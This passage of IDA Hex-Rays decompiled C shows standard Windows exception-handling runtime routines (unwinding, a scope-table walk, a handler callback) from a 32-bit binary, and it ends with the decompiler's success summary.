          *(_DWORD *)(v4 + 12) = *(_DWORD *)(v9 + 4 * v10);
          v4 = 0;
          v5 = 0;
          (*(void (__fastcall **)(_DWORD, _DWORD))(v9 + 4 * v10 + 8))(0, 0);
        }
      }
      v6 = *(_DWORD *)(v4 + 8);
      v5 = *(_DWORD *)(v6 + 12 * v5);
    }
  }
  return 1;
}
// 40206A: variable 'v10' is possibly undefined

//----- (004020F0) --------------------------------------------------------
void __cdecl sub_4020F0(void *a1)
{
  RtlUnwind(a1, &loc_40210C, 0, 0);
}

//----- (00402120) --------------------------------------------------------
int __cdecl sub_402120(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (00402150) --------------------------------------------------------
int __usercall sub_402150@<eax>(int a1@<ebp>, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-8h] [ebp-1Ch]
  int (__cdecl *v8)(int, int, int, _DWORD *); // [esp-4h] [ebp-18h]

  v8 = sub_402120;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || a3 != -1 && v5 <= a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_402219(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int, int, _DWORD *)))(v4 + 4 * v6 + 8))(
        v7,
        v8);
    }
  }
  return result;
}
// 4021B7: variable 'v7' is possibly undefined
// 4021B7: variable 'v8' is possibly undefined

//----- (00402219) --------------------------------------------------------
int __userpurge sub_402219@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_404064[2] = a3;
  dword_404064[1] = result;
  dword_404064[3] = a2;
  return result;
}

// nfuncs=12 queued=11 decompiled=11 lumina nreq=0 worse=0 better=0
// ALL OK, 11 function(s) have been successfully decompiled
